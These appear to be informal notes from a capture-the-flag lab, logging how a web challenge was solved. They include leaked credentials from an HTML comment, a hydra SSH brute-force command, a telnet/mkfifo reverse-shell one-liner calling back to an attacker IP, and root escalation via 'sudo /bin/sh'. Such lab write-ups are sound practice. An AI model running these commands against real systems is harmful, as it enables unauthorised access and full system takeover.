
  <!--

    Note to self, remember username!

    Username: R1ckRul3s
      pass Robots.txt Wubbalubbadubdub
  -->
  Look around the file system for the other ingredient.

  ssh into using 

  hydra -v -V -u -l R1ckRul3s -P ~Desktop/ -t 1 10.10.254.250 ssh
  ^^^
  didntdo that
  got in with reverse shell in command pannel 
  TF=$(mktemp -u);mkfifo $TF && telnet 10.13.2.66 9001 0<$TF | /bin/sh 1>$TF

  sudo -l lists all
  sudo /bin/sh to get root
  all the flags are in fs